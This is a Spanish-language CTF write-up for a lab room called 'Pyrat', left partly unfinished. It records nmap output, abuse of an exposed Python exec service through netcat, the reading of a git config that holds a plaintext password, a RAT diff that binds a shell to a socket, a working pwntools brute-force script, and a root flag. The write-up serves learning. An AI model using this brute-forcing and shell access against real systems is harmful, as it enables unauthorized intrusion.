---
Titulo: Pyrat
Fecha: 15/09/2025
categoria:
  - Enumeration
Dificultad_oficial: Fácil
Dificultad_percibida: ""
Estado: No terminado
---
# **Repetir**
## 1. Descripción del reto
_Resumen breve de qué trata el reto y objetivo principal._
Parece que esta sala va a tratar de enumeración del objetivo y posterior fuerza bruta en el.

## 2. Enumeración / Reconocimiento
_Detalla aquí todos los pasos de reconocimiento que seguiste:_
- Subapartado: enumeración de puertos, servicios, formularios, etc.
- Comandos, URLs relevantes, notas rápidas.
```shell
root@ip-10-10-73-217:~# nmap -Pn -sS -sC -sV 10.10.16.251
Starting Nmap 7.80 ( https://nmap.org ) at 2025-09-15 13:21 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.10.16.251
Host is up (0.00018s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
|     source code string cannot contain null bytes
|   FourOhFourRequest, LPDString, SIPOptions: 
|     invalid syntax (<string>, line 1)
|   GetRequest: 
|     name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     name 'OPTIONS' is not defined
|   Help: 
|_    name 'HELP' is not defined
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
|_http-title: Site doesnt have a title (text/html; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.80%I=7%D=9/15%Time=68C804C5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1A,"name\x20'GET'\x20is\x20not\x20defin
SF:ed\n")%r(X11Probe,2D,"source\x20code\x20string\x20cannot\x20contain\x20
SF:null\x20bytes\n")%r(FourOhFourRequest,22,"invalid\x20syntax\x20\(<strin
SF:g>,\x20line\x201\)\n")%r(Socks4,2D,"source\x20code\x20string\x20cannot\
SF:x20contain\x20null\x20bytes\n")%r(HTTPOptions,1E,"name\x20'OPTIONS'\x20
SF:is\x20not\x20defined\n")%r(RTSPRequest,1E,"name\x20'OPTIONS'\x20is\x20n
SF:ot\x20defined\n")%r(DNSVersionBindReqTCP,2D,"source\x20code\x20string\x
SF:20cannot\x20contain\x20null\x20bytes\n")%r(DNSStatusRequestTCP,2D,"sour
SF:ce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Help,1
SF:B,"name\x20'HELP'\x20is\x20not\x20defined\n")%r(LPDString,22,"invalid\x
SF:20syntax\x20\(<string>,\x20line\x201\)\n")%r(SIPOptions,22,"invalid\x20
SF:syntax\x20\(<string>,\x20line\x201\)\n")%r(LANDesk-RC,2D,"source\x20cod
SF:e\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(NotesRPC,2D,"so
SF:urce\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\n")%r(Java
SF:RMI,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20bytes\
SF:n")%r(afp,2D,"source\x20code\x20string\x20cannot\x20contain\x20null\x20
SF:bytes\n")%r(giop,2D,"source\x20code\x20string\x20cannot\x20contain\x20n
SF:ull\x20bytes\n");
MAC Address: 02:B0:1B:EC:F2:FB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.11 seconds
```

Vale, voy a analizar los directorios de ese puerto.

Ok, no encontré nada y me desespere a probar otras cosas y no conseguía ningún resultado por lo que vi como podía avanzar, y a lo que se refiere el mensaje de "una conexión más básica" es usar netcat (Me quede cerca porque use telnet) al puerto que me dicen.

```shell
root@ip-10-10-73-217:~# netcat 10.10.16.251 8000
print("Hello")
Hello
```

Eso es lo último que vi a si que desde aquí vuelvo a estar a ciegas, lo primero que voy a intentar es invocar una pseudo terminal con python haber si me puedo mover mejor con ello, sino buscare comandos que pueda usar para identificar posibles vectores de la máquina.

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
invalid syntax (<string>, line 1)
```

Como era lógico, no me va a dejar. Lo primero que voy a probar es ver la versión de python, del SO, etc...

```shell
import sys
print(sys.version)
3.8.10 (default, Mar 18 2025, 20:04:55) 
[GCC 9.4.0]
print(sys.platform)
linux
```

Después de muchos otros comandos, he conseguido lo siguiente:

```shell
[...]
print(os.listdir("/"))
['lib', 'boot', '.badr-info', 'sbin', 'var', 'lib32', 'media', 'libx32', 'proc', 'etc', 'lost+found', 'opt', 'tmp', 'sys', 'srv', 'home', 'run', 'mnt', 'root', 'dev', 'swap.img', 'usr', 'bin', 'lib64']

print(os.listdir("/media"))
[]

print(os.listdir("/proc"))
[...]

print(os.listdir("/var"))
['backups', 'lib', 'lock', 'mail', 'cache', 'opt', 'tmp', 'log', 'run', 'local', 'crash', 'spool']

print(os.listdir("/var/spool"))
['rsyslog', 'mail', 'postfix', 'cron']

print(os.listdir("/var/spool/mail"))
['www-data', 'root', 'think']

print(os.listdir("/var/spool/mail/think"))
[Errno 20] Not a directory: '/var/spool/mail/think'
print(open(/var/spool/mail/think), 'r').read
print(open("/var/spool/mail/think", "r").read())
From root@pyrat  Thu Jun 15 09:08:55 2023
Return-Path: <root@pyrat>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by pyrat.localdomain (Postfix, from userid 0)
        id 2E4312141; Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
Subject: Hello
To: <think@pyrat>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20230615090855.2E4312141@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:08:55 +0000 (UTC)
From: Dbile Admen <root@pyrat>

Hello jose, I wanted to tell you that i have installed the RAT you posted on your GitHub page, i'll test it tonight so don't be scared if you see it running. Regards, Dbile Admen
```

El mensaje no da mucha información por lo que voy a seguir viendo que encuentro, de momento la prioridad es encontrar ese RAT o la cuenta de github 👀.

```shell
print(os.listdir("/opt/dev/.git"))
['objects', 'COMMIT_EDITMSG', 'HEAD', 'description', 'hooks', 'config', 'info', 'logs', 'branches', 'refs', 'index']
```

Vale, ahora toca ver toda la info que hay ahí.

```shell
print(open("/opt/dev/.git/config", "r").read())
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[user]
    	name = Jose Mario
    	email = josemlwdf@github.com

[credential]
    	helper = cache --timeout=3600

[credential "https://github.com"]
    	username = think
    	password = _TH1NKINGPirate$_
```

```shell
root@ip-10-10-20-14:~# ssh think@10.10.147.146
The authenticity of host '10.10.147.146 (10.10.147.146)' can't be established.
ECDSA key fingerprint is SHA256:H7GV1djdE9yc+wTKmu5sSjUvTXBuQrYn+59+FLJuDQo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.147.146' (ECDSA) to the list of known hosts.
think@10.10.147.146's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-138-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 15 Sep 2025 02:42:16 PM UTC

  System load:  0.0               Processes:             112
  Usage of /:   48.1% of 9.75GB   Users logged in:       0
  Memory usage: 13%               IPv4 address for ens5: 10.10.147.146
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

22 updates can be applied immediately.
13 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Your Hardware Enablement Stack (HWE) is supported until April 2025.

You have mail.
Last login: Thu Jun 15 12:09:31 2023 from 192.168.204.1
```

VAMOS !

Con ayuda del writeUP:
```shell
think@ip-10-10-147-146:/opt/dev/.git/logs/refs/heads$ git show 0a3c36d66369fd4b07ddca72e5379461a63470bf
commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint

diff --git a/pyrat.py.old b/pyrat.py.old
new file mode 100644
index 0000000..ce425cf
--- /dev/null
+++ b/pyrat.py.old
@@ -0,0 +1,27 @@
+...............................................
+
+def switch_case(client_socket, data):
+    if data == 'some_endpoint':
+        get_this_enpoint(client_socket)
+    else:
+        # Check socket is admin and downgrade if is not aprooved
+        uid = os.getuid()
+        if (uid == 0):
+            change_uid()
+
+        if data == 'shell':
+            shell(client_socket)
+        else:
+            exec_python(client_socket, data)
+
+def shell(client_socket):
+    try:
+        import pty
+        os.dup2(client_socket.fileno(), 0)
+        os.dup2(client_socket.fileno(), 1)
+        os.dup2(client_socket.fileno(), 2)
+        pty.spawn("/bin/sh")
+    except Exception as e:
+        send_data(client_socket, e
+
+...............................................
```

Con ayuda de "jaxafed":
```python
#!/usr/bin/env python3
from pwn import remote, context
import threading

target_ip = "10.10.98.190"
target_port = 8000
wordlist = "/usr/share/seclists/Passwords/500-worst-passwords.txt"
stop_flag = threading.Event()
num_threads = 100

def brute_force_pass(passwords):
    context.log_level = "error"
    r = remote(target_ip, target_port)
    for i in range(len(passwords)):
        if stop_flag.is_set():
            r.close()
            return
        if i % 3 == 0:
            r.sendline(b"admin")
            r.recvuntil(b"Password:\n")
        r.sendline(passwords[i].encode())
        try:
            if b"shell" in r.recvline(timeout=0.5):
                stop_flag.set()
                print(f"[+] Password found: {passwords[i]}")
                r.close()
                return
        except:
            pass
    r.close()
    return

def main():
    passwords = [line.strip() for line in open(wordlist, "r").readlines()]
    passwords_length = len(passwords)
    step = (passwords_length + num_threads - 1) // num_threads
    threads = []
    for i in range(num_threads):
        start = i * step
        end = min(start + step, passwords_length)
        if start < passwords_length:
            thread = threading.Thread(target=brute_force_pass, args=(passwords[start:end],))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
```

```shell
root@ip-10-10-20-14:~# python3 programa.py 
[+] Password found: abc123
```

```shell
root@ip-10-10-20-14:~# nc 10.10.147.146 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# ls
ls
pyrat.py  root.txt  snap
# cat root.txt	
cat root.txt
ba5ed03e9e74bb98054438480165e221
```
## 3. Explotación / Desarrollo
_Describe cómo encontraste y explotaste la vulnerabilidad:_

## 4. Post‑explotación (si aplica)
_Aquí anotas acciones posteriores a la explotación, pivoteos o escalados._

## 5. Solución final y Flag
*-Usuario con el que haz obtenido la flag-*
	-*Forma en la que conseguiste la flag*

Ejemplo:
- Usuario: Pokemon
	- `P0kEmOn.zip` → `grass-type.txt` → hex → `PoKeMoN{Bulbasaur}`

## 6. Notas y aprendizajes

- Punto fuerte: ...
    
- Dificultad encontrada: ...
    
- Conceptos nuevos aprendidos: ...



print(open("/opt/dev/.git/info/exclude", "r").read())

print(os.listdir("/opt/dev/.git/info/exclude"))